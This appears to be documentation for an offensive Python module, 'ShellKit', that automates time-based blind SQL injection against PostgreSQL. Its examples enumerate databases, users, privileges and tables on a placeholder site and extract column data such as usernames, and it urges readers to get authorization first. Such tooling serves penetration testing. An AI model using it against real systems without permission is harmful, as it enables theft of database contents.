# SQL Injection Module Documentation

## Overview

The SQL Injection module in ShellKit provides a robust framework for testing and exploiting SQL injection vulnerabilities in PostgreSQL databases. It specifically focuses on time-based blind SQL injection techniques, which are particularly useful when direct output is not available.

## Features

- Database enumeration
- Table and column discovery
- Data extraction
- User privilege enumeration
- Database user identification
- Blind SQL injection techniques

## Technical Details

### Supported Database Types
- PostgreSQL (current version)
- Future support planned for MySQL, MSSQL

### Detection Methods
- Time-based blind injection
- Boolean-based blind injection (planned)
- Error-based injection (planned)

## Usage

### Basic Usage

```python
from shellkit.sql_injection import PostgresExploiter

# Initialize the exploiter
exploiter = PostgresExploiter(sleep_time=3)

# Target URL with injectable parameter
url = "http://vulnerable.com/page.php?id=1"

# Extract database information
dbs = exploiter.extract_dbs(url)
print(f"Found databases: {dbs}")
```

### Extract Database User

```python
# Get current database user and privileges
user_info = exploiter.extract_current_user(url)
print(f"Current user: {user_info['username']}")
print(f"User privileges: {user_info['privileges']}")

# Check if current user is superuser
is_super = exploiter.is_superuser(url)
print(f"Is superuser: {is_super}")
```

### Extract Table Information

```python
# Get tables and their columns
tables_info = exploiter.extract_table_info(url)
for table_info in tables_info:
    for table_name, columns in table_info.items():
        print(f"\nTable: {table_name}")
        print(f"Columns: {columns}")
```

### Extract Table Data

```python
# Extract specific data from a table
data = exploiter.extract_data(
    url=url,
    table_name="users",
    column_name="username",
    limit=5
)
print(f"Extracted data: {data}")
```

## Advanced Features

### Custom Sleep Times
You can adjust the sleep time used in time-based injection:

```python
exploiter = PostgresExploiter(sleep_time=5)  # Longer delay for unstable connections
```

### Handling Different Character Sets
The module automatically handles various character sets including:
- Alphanumeric characters
- Special characters
- Database-specific characters

## Security Considerations

1. **Authorization**: Always ensure you have explicit permission to test for SQL injection vulnerabilities.
2. **Legal Compliance**: Follow local laws and regulations regarding security testing.
3. **Impact**: Time-based injection can impact database performance; use reasonable sleep times.
4. **Data Protection**: Handle any extracted sensitive data according to relevant data protection laws.

## Error Handling

The module includes robust error handling for common scenarios:
- Network timeouts
- Invalid responses
- Database errors
- Connection issues

## Examples

### Complete Enumeration Example

```python
from shellkit.sql_injection import PostgresExploiter

def enumerate_database(url):
    exploiter = PostgresExploiter()
    
    # Get database user
    user_info = exploiter.extract_current_user(url)
    print(f"Database User: {user_info['username']}")
    print(f"Privileges: {user_info['privileges']}")
    
    # Get databases
    databases = exploiter.extract_dbs(url)
    print(f"Databases: {databases}")
    
    # Get tables and columns
    for db in databases:
        tables = exploiter.extract_table_info(url, db)
        print(f"\nDatabase: {db}")
        for table_info in tables:
            for table, columns in table_info.items():
                print(f"  Table: {table}")
                print(f"  Columns: {columns}")
                
                # Get sample data
                for column in columns:
                    data = exploiter.extract_data(url, table, column, limit=2)
                    print(f"    {column}: {data}")

# Usage
url = "http://vulnerable.com/page.php?id=1"
enumerate_database(url)
```

## Troubleshooting

Common issues and solutions:

1. **Slow Response Times**
   - Increase sleep_time parameter
   - Check network connectivity
   - Verify database load

2. **False Positives**
   - Adjust timeout settings
   - Verify injection point
   - Check for WAF interference

3. **Incomplete Data**
   - Verify character set coverage
   - Check for data truncation
   - Ensure sufficient timeout values

## Future Enhancements

Planned features:
- Support for additional database types
- Error-based injection techniques
- Automated injection point detection
- WAF bypass techniques
- Advanced payload generation
- Parallel data extraction

## Contributing

If you'd like to contribute to this module:
1. Check the issue tracker for open issues
2. Follow the project's coding standards
3. Include tests for new features
4. Update documentation as needed
5. Submit a pull request

## Support

For issues and support:
- Open an issue in the GitHub repository
- Check existing documentation
- Review closed issues for similar problems